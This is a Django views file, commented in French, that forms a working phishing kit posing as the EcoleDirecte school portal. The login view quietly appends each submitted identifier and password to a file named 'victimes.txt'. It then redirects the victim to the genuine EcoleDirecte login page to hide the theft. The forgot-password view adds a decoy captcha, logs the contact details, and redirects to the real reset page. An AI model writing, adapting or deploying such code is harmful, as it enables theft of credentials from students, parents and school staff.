from django.shortcuts import render, redirect # Ajout de redirect
from datetime import datetime
import random
import string

def login_view(request):
    if request.method == "POST":
        email = request.POST.get('identifiant')
        password = request.POST.get('mot_de_passe')
        date_action = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Enregistrement discret
        with open("victimes.txt", "a+") as f:
            f.write(f"--- {date_action} ---\nID: {email} | PW: {password}\n")

        # REDIRECTION : On envoie l'utilisateur sur le vrai site
        # L'URL officielle est généralement https://www.ecoledirecte.com/Login
        return redirect("https://www.ecoledirecte.com/Login")

    return render(request, 'auth_app/login.html')




def generate_captcha():
    # Génère une chaîne aléatoire de 5 chiffres
    return ''.join(random.choices(string.digits, k=5))

def forgot_password_view(request):
    # Si c'est un premier accès (GET), on génère un captcha
    if request.method == "GET":
        captcha_code = generate_captcha()
        request.session['captcha_secret'] = captcha_code
    
    if request.method == "POST":
        contact = request.POST.get('contact_info')
        user_captcha = request.POST.get('captcha_code')
        # On récupère le vrai code stocké en session
        real_captcha = request.session.get('captcha_secret')

        # VERIFICATION DU CAPTCHA
        if user_captcha != real_captcha:
            # Si c'est faux, on régénère un code et on renvoie une erreur
            new_captcha = generate_captcha()
            request.session['captcha_secret'] = new_captcha
            return render(request, 'auth_app/forgot_password.html', {
                'error': 'Le code de sécurité est incorrect.',
                'captcha': new_captcha
            })

        # Si le captcha est correct, on capture les données
        date_action = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("victimes.txt", "a+") as f:
            f.write(f"--- RESET PWD VALIDE le {date_action} ---\n")
            f.write(f"Contact : {contact}\n")
            f.write("-" * 30 + "\n")

        return redirect("https://www.ecoledirecte.com/MdpOublie")

    # On passe le captcha généré au template
    return render(request, 'auth_app/forgot_password.html', {
        'captcha': request.session.get('captcha_secret')
    })
